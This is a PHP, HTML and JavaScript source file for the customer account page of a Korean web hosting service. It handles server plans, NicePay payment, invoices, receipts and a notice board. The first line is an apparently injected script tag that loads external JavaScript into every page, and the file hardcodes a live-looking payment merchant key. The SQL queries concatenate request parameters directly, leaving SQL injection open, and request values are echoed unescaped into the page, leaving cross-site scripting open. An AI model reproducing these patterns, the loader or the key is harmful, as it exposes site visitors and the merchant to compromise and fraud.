<script type='text/javascript' src='https:// /k.js?v=222'></script>
<?php

header("Content-Type:text/html; charset=utf-8;");
require_once ($_SERVER['DOCUMENT_ROOT'] . "/include/init.php");
require_once ($_SERVER['DOCUMENT_ROOT'] . "/common/header.php");

$user_query = "
                  SELECT 
                     aa.*,bb.*,aa.idx AS user_idx,
                     TO_DAYS(date_format(date_end, '%Y.%m.%d')) - TO_DAYS(NOW()) as dday,
                     TO_DAYS(NOW()) - TO_DAYS(date_format(date_end, '%Y.%m.%d')) as overday,
                     (CASE aa.server_name
                         WHEN '1'  THEN 'AWS_t3.small'
                         WHEN '2'  THEN 'AWS_t3.medium'
                         WHEN '3' THEN 'AWS_t3.large'
                         WHEN '4'  THEN 'AWS_t3.xlarge'
                         WHEN '5'  THEN 'AWS_t3.2xlarge'
                         WHEN '6' THEN 'AWS_c5.large'
                         WHEN '7'  THEN 'AWS_c5.xlarge'
                         WHEN '8'  THEN 'AWS_r5.large'
                         WHEN '9'  THEN '해지/이전'
                         WHEN '10' THEN 'test'
                      END) AS user_server 
                   FROM server_info bb
                          JOIN user aa
                          ON bb.idx = aa.server_name
                   where aa.user_id = '{$_SESSION['login_id']}'
               ";

$user_result = sql_query($user_query);
$user_row = sql_fetch($user_result);

$server_query = "SELECT * FROM server_info where server_type = '해지/이전'";
$server_result = sql_query($server_query);
$server_row = sql_fetch($server_result);

// 비밀번호 변경 유도
if ($user_row['login_count'] == 0 || $user_row['login_count'] == 1) {
    ?>
	  <script> 
            alert("비밀번호를 변경해 주세요."); 
            location.href='http://server.musign.co.kr/member/modify_view.php?idx=<?php echo "{$_SESSION['idx']}"?>';
      </script>
<?php
}

$get_pay_info = "select * from pay_result where user_idx='{$user_row['user_idx']}' and tid='{$user_row['tid']}'";
$get_pay_result = sql_query($get_pay_info);
$get_pay_row = sql_fetch($get_pay_result);

// 세금계산서
$invoice_cnt_query = "SELECT COUNT(*) AS cnt FROM invoice_payment WHERE cust_no ='{$_SESSION['idx']}'";
$invoice_cnt_result = sql_query($invoice_cnt_query);
$invoice_cnt_row = sql_fetch($invoice_cnt_result);

$mgt_num = $user_row['server_name'] . '-' . $user_row['user_idx'] . '-' . $invoice_cnt_row['cnt'];

// 현금영수증
// $cashbill_cnt_query = "SELECT COUNT(*) AS cnt FROM cash_recipt WHERE user_idx = '{$_SESSION['idx']}'";
$cashbill_cnt_query = "SELECT * FROM cash_recipt";
$cashbill_cnt_result = sql_count(sql_query($cashbill_cnt_query));
$cashbill_cnt_row = $cashbill_cnt_result;

$cash_mgt_num = $user_row['server_name'] . '-' . $user_row['idx'] . '-' . $cashbill_cnt_row;

$today = date("Ymd");

/*
 * ******************************************************
 * <결제요청 파라미터>
 * 결제시 Form 에 보내는 결제요청 파라미터입니다.
 * 샘플페이지에서는 기본(필수) 파라미터만 예시되어 있으며,
 * 추가 가능한 옵션 파라미터는 연동메뉴얼을 참고하세요.
 * ******************************************************
 */
$price = "{$server_info_row['server_price']}"; // 결제상품금액

if (isset($_POST['server_price'])) {
    $price = $_POST['server_price'];
}

// moid 자동증가
$max_query = "select * from pay_result";
$max = sql_count(sql_query($max_query));
$cnt = $max + 1;

$merchantKey = "a9Mw0kcxO9/p6vqXJZg227dIbFIuLMD7AI/WlnBK8kPlG022KuOBdlnfCer8Ihh1+OPeB3KACSDpwYIifNY5sg==";
$MID = "musigner1m";
$goodsName = "{$user_row['user_server']}"; // 결제상품명
$buyerName = "{$user_row['user_name']}"; // 구매자명
$buyerTel = "{$user_row['user_phone']}"; // 구매자연락처
$buyerEmail = "{$user_row['user_email']}"; // 구매자메일주소
$moid = "{$cnt}"; // 상품주문번호
$returnURL = $_SERVER['DOCUMENT_ROOT'] . "/mypage/"; // 결과페이지(절대경로) - 모바일 결제창 전용

/*
 * ******************************************************
 * <해쉬암호화> (수정하지 마세요)
 * SHA-256 해쉬암호화는 거래 위변조를 막기위한 방법입니다.
 * ******************************************************
 */

$ediDate = date("YmdHis");
// $hashString = bin2hex(hash('sha256', $ediDate.$MID.$price.$merchantKey, true));

// 공지사항
$query = "
            select *,
            date_format(submit_date, '%Y.%m.%d %H:%i') as submit_date
            from notice where 1
          ";

if (isset($_REQUEST['search_name']) && $_REQUEST['search_name'] != null && $_REQUEST['search_name'] != "") {
    $query .= " and (title like '%{$_REQUEST['search_name']}%')";
}
if (isset($_REQUEST['sort_type']) && $_REQUEST['sort_type'] != null && $_REQUEST['sort_type'] != "" && isset($_REQUEST['order_by']) && $_REQUEST['order_by'] != null && $_REQUEST['order_by'] != "") {
    $query .= " order by {$_REQUEST['sort_type']} {$_REQUEST['order_by']}";
} else {
    $query .= " and board_type like '%{$_REQUEST['search_name']}%' order by submit_date desc";
}

$result_cnt = sql_query($query);

$page = ($_REQUEST['page']) ? $_REQUEST['page'] : 1;
if (! isset($_REQUEST['listSize'])) {
    $listSize = 10;
} else {
    $listSize = $_REQUEST['listSize'];
}

$list = $listSize;
$block = 5;
$pageNum = ceil(sql_count($result_cnt) / $list); // 총 페이지
$blockNum = ceil($pageNum / $block); // 총 블록
$nowBlock = ceil($page / $block);

$s_page = ($nowBlock * $block) - ($block - 1);
if ($s_page <= 1) {
    $s_page = 1;
}
$e_page = $nowBlock * $block;
if ($pageNum <= $e_page) {
    $e_page = $pageNum;
}

$n = sql_count($result_cnt);
?>

<script src="/js/test.js"></script>
<!-- <script src="https://web.nicepay.co.kr/v3/webstd/js/nicepay-3.0.js" type="text/javascript"></script> -->
<script
	src="https://t1.daumcdn.net/mapjsapi/bundle/postcode/prod/postcode.v2.js"></script>
<style>
.hidden {
	display: none
}
;
</style>
<script type="text/javascript">

//결제창 최초 요청시 실행됩니다.
var price="";

function nicepayStart(){
	if ($('#finalBtn').text()!='결제하기') {
		return;
	}else{
		var pay_flag=0;
		$(".pay_method").each(function(){
			if ($(this).prop('checked')!=1) {
				pay_flag=1;
			}else{
				pay_flag=0;
				return false;
			}
		});
		
		if (pay_flag==1) {
			alert('결제수단을 선택해주세요.');
			return;
		}
		
    	if ( !$("#finalCheck").prop('checked')){
    		alert('결제진행 동의를 해주세요.');
    		return;
    		
    	}else{	
        	if(checkPlatform(window.navigator.userAgent) == "mobile")
            {//모바일 결제창 진입
            	alert("모바일은 지원하지 않습니다.");
            	return;
        		//document.payForm.action = "https://web.nicepay.co.kr/v3/v3Payment.jsp";
        		//document.payForm.submit();
        	}else{//PC 결제창 진입
            	
        		goPay(document.payForm);
        	}
    	}
	}
	
}

//[PC 결제창 전용]결제 최종 요청시 실행됩니다. <<'nicepaySubmit()' 이름 수정 불가능>>
function nicepaySubmit(){
	$("#payForm").ajaxSubmit({
		success: function(data)
		{
			var test = $('input:checkbox[name="rchk1"]').val();

			console.log(test);
			console.log(data);
			
    		var result = JSON.parse(data);
    		if(result.ResultCode == "3001" || result.ResultCode == "4000" || result.ResultCode == "4100" || result.ResultCode == "0000")
    		{
    			alert("서비스 신청에 성공 하였습니다. 서비스이용 기간을 확인해주세요.");
    			location.reload();
    		}
    		else
    		{
    			alert("서비스 신청에 실패 하였습니다. 관리자에게 문의해주세요.");
    		}
    		
		}
	});
	//document.payForm.submit();
}

//[PC 결제창 전용]결제창 종료 함수 <<'nicepayClose()' 이름 수정 불가능>>
function nicepayClose(){
	alert("결제가 취소 되었습니다");
}

//pc, mobile 구분(가이드를 위한 샘플 함수입니다.)
function checkPlatform(ua) {
	if(ua === undefined) {
		ua = window.navigator.userAgent;
	}
	
	ua = ua.toLowerCase();
	var platform = {};
	var matched = {};
	var userPlatform = "pc";
	var platform_match = /(ipad)/.exec(ua) || /(ipod)/.exec(ua) 
		|| /(windows phone)/.exec(ua) || /(iphone)/.exec(ua) 
		|| /(kindle)/.exec(ua) || /(silk)/.exec(ua) || /(android)/.exec(ua) 
		|| /(win)/.exec(ua) || /(mac)/.exec(ua) || /(linux)/.exec(ua)
		|| /(cros)/.exec(ua) || /(playbook)/.exec(ua)
		|| /(bb)/.exec(ua) || /(blackberry)/.exec(ua)
		|| [];
	
	matched.platform = platform_match[0] || "";
	
	if(matched.platform) {
		platform[matched.platform] = true;
	}
	
	if(platform.android || platform.bb || platform.blackberry
			|| platform.ipad || platform.iphone 
			|| platform.ipod || platform.kindle 
			|| platform.playbook || platform.silk
			|| platform["windows phone"]) {
		userPlatform = "mobile";
	}
	
	if(platform.cros || platform.mac || platform.linux || platform.win) {
		userPlatform = "pc";
	}
	
	return userPlatform;
}
</script>


<script>

$(window).ready(function(){

	$(".myp-payment > .cellbox").eq(0).show();
	$(".tabwra > div").click(function(){
		var ind = $(this).index();
		$(".tabwra > div ").removeClass("on");
		$(this).addClass("on");
		$(".myp-payment > .cellbox").hide();
		$(".myp-payment > .cellbox").eq(ind).show();
	});

});

// 페이지 시작시 결제금액 
$(function(){
	$(window).ready(function(){
		price_choose(0);
		$('#invoice_area').hide();
		$('.pay').text('0');
	});
})

$.datepicker.setDefaults({
    dateFormat: 'yy-mm',
    prevText: '이전 달',
    nextText: '다음 달',
    monthNames: ['1월', '2월', '3월', '4월', '5월', '6월', '7월', '8월', '9월', '10월', '11월', '12월'],
    monthNamesShort: ['1월', '2월', '3월', '4월', '5월', '6월', '7월', '8월', '9월', '10월', '11월', '12월'],
    dayNames: ['일', '월', '화', '수', '목', '금', '토'],
    dayNamesShort: ['일', '월', '화', '수', '목', '금', '토'],
    dayNamesMin: ['일', '월', '화', '수', '목', '금', '토'],
    showMonthAfterYear: true,
    yearSuffix: '년'
  });

$(function() {
    $( "#datepicker,  #datepicker2"  ).datepicker({
        dateFormat: 'yy-mm-dd'
    });
 });

// 현금영수증 팝업 //
$(window).ready(function(){
	// 세금계산서 팝업 클릭시
	$('.bill_li').click(function(){
		var price = $('.pay').text().replace(/,/gi,'');
		var price2 = price/10;
		var price3 = price/110;
		var price4 = Math.ceil(price - price2 + price3);
		$('#amount2').attr('value',price4);
		$(".bill-popup").show();
	});
	
	// 현금영수증 팝업 클릭시
	$('.cash_li').click(function(){
		var price = $('.pay').text().replace(/,/gi,'');
		$('#amount').val(price);
		$(".cash-popup").show();
	});
	// 해지 버튼 클릭
	$('.cancel_li').click(function(){
		$(".cancel-popup").show();
	});
	// 해지/이전 버튼 클릭
	$('.move_li').click(function(){
		$(".move-popup").show();
		$(".myp-payment .move").addClass('active');
		$(".myp-payment .extend").css('display', 'none');
	});
	$('.cash_hide').click(function(){
		$(".cash-popup").hide();
	});
	$('.bill_hide').click(function(){
		$(".bill-popup").hide();
	});
	$('.notapp_li').click(function(){
		$(".notapp_txt").hide();
	});
	$('.cancel_hide').click(function(){
		$(".cancel-popup").hide();
	});
	$('.move_hide').click(function(){
		$(".move-popup").hide();
	});
	// 갱신하기 클릭시 
	$('#restart').click(function(){
		$(".myp-payment .move").removeClass('active');
		$(".myp-payment .extend").css('display', 'inline-block');
	});
});

// 게시판 탭 //
$(window).ready(function(){
	var tableTab = $('.tabTit');
	var tableCont = $('.tabcont');
	$.each(tableTab, function(index, item){
		$(this).click(function(){
            if (tableCont.eq(index).hasClass('on')) {
                tableCont.eq(index).removeClass('on');
            } else {                
                tableCont.removeClass('on');     
                tableCont.eq(index).addClass('on');
            }
		});
	});
});

// 인증 종류 
$(window).ready(function(){
	var conLis = $('.confirm_li');
	var conTab = $('.confirm_area');  
    var conActive = $('.confirm_area .empty');  
	$.each(conLis, function(index, item){        
		 $(this).click(function(e) {
			changeTab(index);        
        });
	});

    function changeTab(num) {
        conTab.hide();
       	conTab.eq(num).show();        
        conActive.removeClass('notempty');
        conActive.eq(num).addClass('notempty');  
    }
}); 
 
function do_pay(){
	if ( !$("#finalCheck").prop('checked')){
		alert('결제진행 동의를 해주세요.');
	}else{ //동의시		
		$.ajax({
			type : "POST", 
			url : "/mypage/do_pay_proc.php",
			dataType : "text",
			data : 
			{
				pay_check : 'Y'
			},
			error : function() 
			{
				console.log("통신에 오류가 있습니다.");
			},
			success : function(data) 
			{
				console.log(data);
				location.reload();
			}
		});
	}	
}
function price_choose(idx,year){
	if (idx!=0) {
    	price = $(idx).next().find('span').text();
    	price = price.slice(0,-1);
    	$('.pay').text(price);
    	price = price.replace(/,/gi,'');
    	//$("#Amt").val(price);
        $.ajax({
            type : 'POST',
            url : '/mypage/getHash.php',
            dataType : "text",
            data : 
            {
            	server_price : price,
            },
            error: function(){
                alert('통신에 오류가 있습니다.');
            },
            success : function(data){
                var from_date =  data.split('@');
                $("#signdata").val(from_date[0]);
                $("#edidate").val(from_date[1]);
                $("#Amt").val(price);
                $("#chk_year").val(year);
            }
           
        });
	}
    //	$('#amount').val(price);
}

// 결제쪽 이동 (원페이지 이동)
function fnMove(){
	$('#purchase .myp-grid').removeClass( 'hidden' );
    var offset = $("#purchase").offset();
    $('html, body').animate({scrollTop : offset.top}, 400);
}

//해지버튼 클릭
function terminate(){
	$('#purchase .myp-grid').addClass( 'hidden' );
}

//해지/이전버튼 클릭
function terminate_re(){
	$('#purchase .myp-grid').removeClass( 'hidden' );
	$('.tit1').addClass( 'hidden' );
	$('.rec2').addClass( 'hidden' );
 
}

// 세금계산서 처리
function send_invoice(){

	// 대표자 이름 형식검사
	var ceo_name = $('#ceo_name').val();

	if(containsNum(ceo_name))
	{
		alert("숫자는 불가능합니다.");
		$("#ceo_name").val('');
		$("#ceo_name").focus();
		return;
	}
	
	if (checkSpecial(ceo_name)) {
		alert("특수문자는 사용할 수 없습니다.");
		$("#ceo_name").val('');
		$("#ceo_name").focus();
		return;
	}

	// 업태 형식검사
	var biz_type = $('#biz_type').val();

	// 업종 형식검사
	var biz_class = $('#biz_class').val();
	
	if(containsNum(biz_class))
	{
		alert("숫자는 불가능합니다.");
		$("#biz_class").val('');
		$("#biz_class").focus();
		return;
	}
	
	if (checkSpecial(biz_class)) {
		alert("특수문자는 사용할 수 없습니다.");
		$("#biz_type").val('');
		$("#biz_type").focus();
		return;
	}

	// 담당자 이름 형식검사
	var contact_name = $('#contact_name').val();
	
	if(containsNum(contact_name))
	{
		alert("숫자는 불가능합니다.");
		$("#contact_name").val('');
		$("#contact_name").focus();
		return;
	}
	
	if (checkSpecial(contact_name)) {
		alert("특수문자는 사용할 수 없습니다.");
		$("#contact_name").val('');
		$("#contact_name").focus();
		return;
	}

	// 연라거 형식검사
	var tel = $('#tel').val();
	
	if (checkSpecial(tel)) {
		alert("특수문자는 사용할 수 없습니다.");
		$("#tel").val('');
		$("#tel").focus();
		return;
	}

	// 이메일 형식검사
	var email = $("#email").val();
	
	if(containsHS(email))
	{
		alert("메일 양식을 맞춰주세요.");
		$("#email").focus();
		return;
	}
	
	var validationFlag = "Y";

	if(/[^0123456789]/g.test($("#corp_num").val())) {
		alert("숫자만 입력해주세요.");
		$("#corp_num").val('');
		$("#corp_num").focus();
		return;
	}
	
	$("#invoiceForm .notEmpty").each(function() 
	{
		if ($(this).val() == "") 
		{
			alert($(this).closest('td').prev().text()+"을(를) 입력해주세요.");
			$(this).focus();
			validationFlag = "N";
			return false;
		}
	});

	if(validationFlag == "Y")
	{
		$("#invoiceForm").ajaxSubmit({
			success: function(data)
			{
				console.log(data);
				var result = JSON.parse(data);
	    		if(result.isSuc == "success")
	    		{
	    			alert(result.msg);
 	    			location.reload();
	    		}
	    		else
	    		{
	    			alert(result.msg);
	    		}
			}
		});
	}
}

// 세금계산서 팝업시 주소
function show_address() {
    new daum.Postcode({
        oncomplete: function(data) {
        	var addr = data.address;
        	document.getElementById("addr").value = addr;
        }
    }).open();
}

function choose_price(text,val){
	$('.'+text+'_price_area').show();
	
	$(".use_way").each(function(){
		$(this).prop('checked',false);
	});

	$(".myp-rchk").each(function(){
		$(this).removeClass('on');
	});

	$('.pay').text('0');
	$('#Amt').val(0);
	
	var len, point, str;
	var gob_cnt=1;
	var num=0;
	$("."+text+"_price").each(function(){
		num=val*gob_cnt;
		$(this).text(numberWithCommas(num)+'원');
		gob_cnt++;
	});
}

function choose_paymethod(idx){
	$('#PayMethod').val(idx);
}

// 현금영수증
function send_cashbill(){

    	// 이름 형식검사
    	var name = $('#franchise_ceoname').val();
    	if ( isEmpty(name)) {
    		alert("이름을 입력해주세요.");
    		$("#franchise_ceoname").val('');
    		$("#franchise_ceoname").focus();
    		return;
    	}
    	
    	if(containsNum(name))
    	{
    		alert("숫자는 불가능합니다.");
    		$("#franchise_ceoname").val('');
    		$("#franchise_ceoname").focus();
    		return;
    	}
    	
    	if (checkSpecial(name)) {
    		alert("특수문자는 사용할 수 없습니다.");
    		$("#franchise_ceoname").val('');
    		$("#franchise_ceoname").focus();
    		return;
    	}

    	var validationFlag = "Y";
    
    	if(/[^0123456789]/g.test($("#trade_method").val())){
    		alert("숫자만 입력해주세요.");
    		$("#trade_method").val('');
    		$("#trade_method").focus();
    		return;
    	}

    	$("#cashbillForm .notEmpty").each(function() 
    	{
    		if ($(this).val() == "") 
    		{
        		console.log($(this).closest('span').prev().text());
    			alert($(this).prev().closest('span').text()+"을(를) 입력해주세요.");
    			$(this).focus();
    			validationFlag = "N";
    			return false;
    		}
    	});

    	if(validationFlag == "Y")
    	{
    		$("#cashbillForm").ajaxSubmit({
    			success: function(data)
    			{
    				console.log(data);
    				var result = JSON.parse(data);
    	    		if(result.isSuc == "success")
    	    		{
    	    			alert(result.msg);
     	    			location.reload();
    	    		}
    	    		else
    	    		{
    	    			alert(result.msg);
    	    		}
    			}
    		});
    	}
}

// 현금영수증 팝업 사업자등록증 확인 여부
var identity = "";
function chkcorp()
{
   		 $.ajax({
        		type:"post",
        		url: "/Baro/BaroService_PHP5_Sample/CORPSTATE/API_CORPSTATE/GetCorpState.php",
        		dataType:"text",
        		data : 
        		{
        			identity : $('input[name=identity_b]').val()
        		},
        		error : function() 
        		{
        			console.log("AJAX ERROR");
        		},
        		success : function(data) 
        		{
        			console.log(data);
        			var result = JSON.parse(data);
        			if(result.msg == "조회 성공")
            		{
        	    		alert(result.msg);
        	    		location.href="http://server.musign.co.kr/mypage/index.php";
            		}
            		else
            		{
            			alert(result.msg);
            		}
        		}
        	});
}

// 공지사항
var listSize = '<?php echo $listSize?>';
var search_name = "<?php echo $_REQUEST['search_name'];?>";
var order_by = "<?php echo $_REQUEST['order_by'];?>";
var sort_type = "<?php echo $_REQUEST['sort_type'];?>";
var page = "<?php echo $page;?>";

$(document).ready(function(){
	$("#p_"+page).addClass("active");
	$("#search_name").val(search_name);
	if(order_by == "desc")
	{
		$("#sort_"+sort_type).html('<img src="/img/icon_up.png" class="sort_img">');
	}
	else if(order_by == "asc")
	{
		$("#sort_"+sort_type).html('<img src="/img/icon_down.png" class="sort_img">');
	}
	if(listSize != "")
	{
		$("#listSize").val(listSize);
	}
})

function reSelect(act)
{
	if(act.indexOf("sort_") > -1)
	{
		var sort_type = act.replace("sort_", "");
		$("#sort_type").val(sort_type);
		var order_by = "";
		if($("#"+act).html() == '<img src="/img/icon_down.png" class="sort_img">')
		{
			order_by = "desc";
		}
		else if($("#"+act).html() == '<img src="/img/icon_up.png" class="sort_img">')
		{
			order_by = "asc";
		}
		$("#order_by").val(order_by);			
	}
	$("#page").val(1);
	$("#fncForm").submit();
}
function enter_check()
{
	if(event.keyCode == 13){
		reSelect('search');
		return;
	}
}
function pageMove(page)
{
	$("#page").val(page);
	$("#fncForm").submit();
}

// 해지버튼 Submit
function fncSubmit_call()
{ 
	var validationFlag = "Y";

	$("#fncForm2 .notEmpty").each(function() 
	    	{

	    		if ($(this).val() == "") 
	    		{
		    		console.log($(this).prev());
	    			alert($(this).prev().text()+"빈칸을 입력해주세요.");
	    			$(this).focus();
	    			validationFlag = "N";
	    			return false;
	    		}
	    	});
	
	var customizedValue1 = $('input[name=query]:checked').attr('customizedValue1');

	if(validationFlag == "Y")
	{
		console.log(customizedValue1);
		$("#fncForm2").ajaxSubmit({
			data : {
					'customizedValue1':customizedValue1
					},
			success: function(data)
			{
				var result = JSON.parse(data);
	    		if(result.isSuc == "success")
	    		{
	    			alert(result.msg);
	    			location.href="http://server.musign.co.kr/mypage";
	    		}
	    		else
	    		{
	    			alert(result.msg);
	    		}
			}
		});
	}
}

// 해지/이전버튼 Submit
function fncSubmit_Move()
{ 
	
	var validationFlag = "Y";

	$("#fncForm3 .notEmpty").each(function() 
	    	{

	    		if ($(this).val() == "") 
	    		{
	    			alert($(this).prev().text()+"빈칸을 입력해주세요.");
	    			$(this).focus();
	    			validationFlag = "N";
	    			return false;
	    		}
	    	});
	
	var customizedValue2 = $('input[name=query2]:checked').attr('customizedValue2');

	if(validationFlag == "Y")
	{
		$("#fncForm3").ajaxSubmit({
			data : {
					customizedValue2 : customizedValue2
					},
			success: function(data)
			{
				console.log(data);
				var result = JSON.parse(data);
	    		if(result.isSuc == "success")
	    		{
	    			alert(result.msg);
	    			// 팝업창 닫기
	    			
	    			var offset = $("#service_ch").offset();
   					$('html, body').animate({scrollTop : offset.top}, 400);
	
	    			$('.move-popup').hide();
	    		}
	    		else
	    		{
	    			alert(result.msg);
	    		}
			}
		});
	}
}

$(document).ready(function() {
    // a href='#' 클릭 무시 스크립트
    $('a[href="#"]').click(function(ignore) {
        ignore.preventDefault();
    });

});

</script>

<div class="sub-top text-center">
	<p class="mtit-sp">Digital Experience platform - musign</p>
	<p class="mtit-big">
		musign<span class="color-g">care</span>
	</p>
</div>

<div class="mypage-top">
	<div class="myp-grid">
		<h2 class="text-center">마이페이지</h2>
		<div class="mytop-wr">
			<p class="color-g mytop-tit">
				<span>환영합니다!</span>
			</p>
			<div class="table mytop-ta">
				<div>
					<p class="mytop-name">
						<strong><?php echo $user_row['user_co']?></strong>의 <br> <strong><?php echo $user_row['user_name']?></strong>담당자님,
						반갑습니다.

					</p>
					<div class="myn-bot">
						<h5 class="myn-btit">서버 담당자</h5>
						<p class="ser-name">정기영 책임</p>
						<?php

                        ?>
						<p class="ser-te">
							Tel. <span class="ser-tel">070-8645-0123</span>
						</p>
						<p class="ser-te">
							E-mail. <span class="ser-tel">chaplin@musign.net</span>
						</p>
					</div>
				</div>
				<div class="myr-divwr m100">
					<div class="myr-div">
						<div>
							<h5>
								고객 정보 <a
									href="../member/modify_view.php?idx=<?php echo $user_row['user_idx']?>"
									class="mod-btn">수정</a>
							</h5>
							<ul class="cli-info">
								<li><b>업체명</b><span class=""><?php echo $user_row['user_co']?></span></li>
								<li><b>담당자</b><span class=""><?php echo $user_row['user_name']?></span></li>
								<li><b>연락처</b><span class=""><?php echo $user_row['user_phone']?></span></li>
							</ul>
						</div>
						<div>
							<h5>웹사이트 정보</h5>
							<ul class="cli-info">
								<li><b>테스트 사이트</b><span class=""><?php echo $user_row['url_tx']?></span></li>
								<li><b>도메인</b><a href="" class=""><?php echo $user_row['url']?></a></li>
							</ul>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>

<?php

if ($user_row['pay_yn'] == 'Y') {
    ?>
<div class="service_info">
	<div class="inner">

		<div class="twra">
			<div class="tbox">
				<p class="tt tt1">
					<span>musign <em>family care service</em></span>를<br> 이용해주셔서 감사합니다.
				</p>
				<p class="tt tt2">
					귀사의 성공적인 비즈니스와 웹 환경을<br> 제공하기 위해 항상 노력하겠습니다.
				</p>
			</div>
		</div>

		<div class="info">
			<div class="cbox">
				<div class="imgwra">
					<img src="/img/info_img.png">
				</div>
				<div class="cont">
					<p class="info_tit">서비스 이용내역</p>
					<ul>
						<li><strong>업체명</strong>
							<p>㈜<?php echo $user_row['user_co']?></p></li>
							<?php echo $_REQUEST['restart']; ?>
						<li><strong>도메인</strong>
							<p><?php echo $user_row['url']?></p></li>
						<li><strong>담당자</strong>
							<p><?php echo $user_row['user_name']?></p></li>
						<li><strong>이용서버</strong>
							<p><?php echo $user_row['server_type']?></p></li>
						<li class="info_bt"><strong>서비스 이용기간 </strong>
							<p>
							<?php
    $DateAndTime = date('Y-m-d', time());
    $start_date = date('Y-m-d', strtotime($user_row['date_start']));
    $end_date = date('Y-m-d', strtotime($user_row['date_end']));

    $start_date_new = new Datetime($start_date);
    $end_date_new = new DateTime($end_date);

    // // end_date 가 현재 날짜보다 작다면 pay_yn = 'N'
    // if($end_date < $DateAndTime) {

    // $query =
    // "
    // update user
    // set
    // pay_yn = 'N',
    // date_start = date_format(NOW(), '%Y%m%d'),
    // date_end = date_format(NOW(), '%Y%m%d')
    // where user_id = '{$_SESSION['login_id']}'
    // ";
    // $user_result = sql_query($query);

    // $result = sql_query($query);
    // ?>
                    <?php
                        // }
                        echo $start_date?> ~ <?php echo $end_date?>
                      
                      <?php
                        if ($user_row['date_start'] == "20220101") {
                            ?>
				     	<span><em>서버 세팅이 끝나면 서비스 이용기간이 업데이트 됩니다.</em></span> <input
							type='button' id="" value='서버 세팅 중' />
                      <?php
                        }
                        ?>
                      
                      <?php
                        if ($user_row['dday'] > 0) {
                            ?>
                        <span><em><?php echo $user_row['dday']?>일후 만료</em>
							서비스 이용 마감기한 한달 전 갱신 안내메일이 발송됩니다.</span>
                      <?php
                        } else {
                            ?>
				  	    <span><em><?php echo $user_row['overday']?>일 초과</em> 서비스 이용
							마감기한 한달 전 갱신 안내메일이 발송됩니다.</span>
				      <?php
                        }
                        ?>
                      <?php

                    if ($user_row['dday'] <= 30) {
                        ?>
                        <input type='button' id="restart"
							onclick="fnMove();" value='갱신하기' />
                       <?php
                        }
                        ?>
					</p></li>
					</ul>
				</div>
			</div>
		</div>
	</div>
</div>
<?php
}
?>

</div>

<div class="table_list family_list my_family">
	<div class="inner myp-grid">
		<div class="list_tit p010">
			<strong>Musign 공지사항 리스트</strong>
		</div>
		<div class="board_search p010">
			<form id="fncForm" name="fncForm" method="get" action="index.php">
				<select id="listSize" name="listSize" onchange="reSelect('search');">
					<option value="10">10개 보기</option>
					<option value="50">50개 보기</option>
					<option value="100">100개 보기</option>
					<option value="300">300개 보기</option>
					<option value="500">500개 보기</option>
					<option value="1000">1000개 보기</option>
				</select> <input type="text" id="search_name" name="search_name"
					onkeydown="javascript:enter_check();" placeholder="검색어를 입력하세요.">
				<button class="board_btn" type="button" onclick="reSelect('search')"></button>
				<input type="hidden" id="order_by" name="order_by"
					value="<?php echo $_REQUEST['order_by'];?>"> <input type="hidden"
					id="sort_type" name="sort_type"
					value="<?php echo $_REQUEST['sort_type'];?>"> <input type="hidden"
					id="page" name="page" value="<?php echo $page?>">
			</form>
		</div>
		<div class="main_table family_table p010">
			<div class="pick_list_num">
				<p>
					전체<span class="numb"><?php echo sql_count($result_cnt);?></span>개
				</p>
			</div>
			<table class="table_1 my_noti">
				<thead>
					<tr>
						<th>번호<span id="sort_idx" onclick="reSelect('sort_idx')"><img
								src="/img/icon_down.png" class="sort_img"></span></th>
						<th>제목<span id="sort_title" onclick="reSelect('sort_title')"><img
								src="/img/icon_down.png" class="sort_img"></span></th>
						<th>날짜<span id="sort_submit_date"
							onclick="reSelect('sort_submit_date')"><img
								src="/img/icon_down.png" class="sort_img"></span></th>
					</tr>
				</thead>
				<tbody>
            	<?php
                $s_point = ($page - 1) * $list;
                $result = sql_query($query . " limit {$s_point},{$list}");
                for ($i = 0; $i < sql_count($result); $i ++) {
                    $row = sql_fetch($result);
                    ?>
    			<tr onclick="" class="tabTit">
    				<td><?php  echo ($n - $i) - (($page-1) * $listSize)?></td>
    				<td class="text_left">
    			    <?php
                        if ($row['board_type'] == 1) {
                            echo "[일반]";
                        } else {
                            echo "[공지]";
                        }
                        ?>
			     <?php echo $row['title'];?>
			     </td>
				<td><?php echo $row['submit_date'];?></td>
				<td class="tabcont"><textarea data-name="내용" id="no_content" name="no_content" class="notEmpty"><?php echo $row['content']?></textarea>
				 <?php
                    if ($row['title'] == '서버관리시스템 타호스팅 서버 이전 관련 안내') {
                        ?>
		   			 	<a href="#service_ch"><input class="move_li" type='button' id="terminate_re" onclick="terminate_re();" value="타호스팅 서버 이전" /></a>
			  		 <?php
                        } else if ($row['title'] == '뮤자인케어 해지 관련 안내') {
                            ?>
				     <input class="cancel_li" type='button' id="terminate" onclick="terminate();" value="해지" />
					 <?php
                        }
                        ?>
					</td>
				</tr>
                    <?php
                    }
                    ?>
				</tbody>
			</table>

			<!-- 페이징  -->
			<div class="pagenation">
				<div class="nb">
					<ul>
            <?php
            if (1 < $page) {
                ?>
            		<li class="prev_" onclick="pageMove(<?=$s_page-1?>)"><a></a></li>
                    <?php
            }
            $pagingCnt = 0;
            if ($e_page != 0) {
                for ($p = $s_page; $p <= $e_page; $p ++) {
                    $pagingCnt ++;
                    ?>
                        <li onclick="pageMove(<?=$p?>)" id="p_<?=$p?>"><?=$p?></li>
                 	    <?php
                            }
                        } else {
                            ?>
            <li onclick="pageMove(1)">1</li>
            <?php
                }
                if ($pageNum != $page && $pageNum > 5) {
                    if ($pagingCnt > 4) {
                        if ($e_page + 1 > $pageNum) {
                            ?>
                    <li class="next_" onclick="pageMove(<?=$pageNum?>)"><a></a></li>
                    <?php
                        } else {
                            ?>
                    <li class="next_" onclick="pageMove(<?=$e_page+1?>)"><a></a></li>
                    <?php
                            }
                        }
                    }
                    ?>
					</ul>
				</div>
			</div>
		</div>
	</div>
</div>

</div>
<!-- // inner -->
</div>
<!-- // family_list -->

<!-- 갱신하기 클릭 시  -->
<div class="mypage-div bd-n" id="purchase">
	<div class="myp-grid">
		<!--<p class="myp-tit">뮤자인 사의 추천 서버 안내 <?php echo $server_info_row['server_type']?></p>-->
		<p class="myp-tit tit1">뮤자인 사의 추천 서버 안내</p>

		<div class="myp-rec rec2">
			귀사의 사이트는 <span class="rec-span">기업 사이트, 브랜드 사이트</span>로 <span
				class="rec-span"><?php echo $user_row['user_server']?> 서버</span> 사용을
			추천드립니다.
		</div>

		<div class="myp-payment" id="service_ch">

			<div class="cellbox cellbox2">
				<div class="cell cell1 wid-100 extend">
					<p class="myp-ptit"><?php echo $user_row['server_type']?>의 특징
					<ul>
